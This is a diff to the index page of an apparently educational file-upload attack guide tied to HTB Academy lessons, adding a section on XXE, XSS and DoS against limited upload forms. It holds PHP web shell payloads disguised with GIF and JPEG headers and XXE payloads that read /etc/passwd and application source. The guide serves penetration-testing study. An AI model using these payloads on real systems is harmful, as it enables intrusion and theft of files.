@@ -10,6 +10,7 @@
 - **[Blacklist Filters](./blacklist-filters.md)** - Extension fuzzing and blacklist bypass techniques
 - **[Basic Bypass Techniques](./basic-bypass-techniques.md)** - Whitelist bypasses, double extensions, character injection
 - **[Type Filters](./type-filters.md)** - Content-Type manipulation and MIME-Type magic bytes bypass
+- **[Limited File Uploads](./limited-file-uploads.md)** - XSS, XXE, and DoS attacks on secure upload forms
 - **[Advanced Bypass Methods](./advanced-bypass-methods.md)** - Complex filtering evasion techniques
 - **[Other Upload Attacks](./other-upload-attacks.md)** - Alternative attack vectors and techniques
 
@@ -75,6 +76,10 @@ Content-Type: image/gif     # Image masquerading
 GIF8<?php system($_GET['cmd']); ?>      # Simple GIF header + PHP  
 GIF89a<?php system($_GET['cmd']); ?>    # Full GIF header + PHP
 \xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>    # JPEG header + PHP
+
+# XXE Attacks (Limited Uploads)
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>  # File disclosure
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>  # Source code
 ```
 
 ### 🎯 **HTB Academy Coverage**
@@ -83,6 +88,7 @@ GIF89a<?php system($_GET['cmd']); ?>    # Full GIF header + PHP
 - ✅ **Blacklist Filters (Page 5)** - Extension fuzzing, .phtml bypass, case sensitivity
 - ✅ **Whitelist Filters (Page 6)** - Double extensions, character injection, null bytes
 - ✅ **Type Filters (Page 7)** - Content-Type headers, MIME-Type magic bytes (GIF8), combined attacks
+- ✅ **Limited File Uploads (Page 8)** - XSS via SVG/HTML, XXE file disclosure, DoS attacks (ZIP bomb, pixel flood)
 - ✅ **Complete Lab Solutions** - All HTB Academy flags and step-by-step walkthroughs
 - ✅ **Advanced Techniques** - Server misconfigurations, automated wordlist generation, polyglot files
 
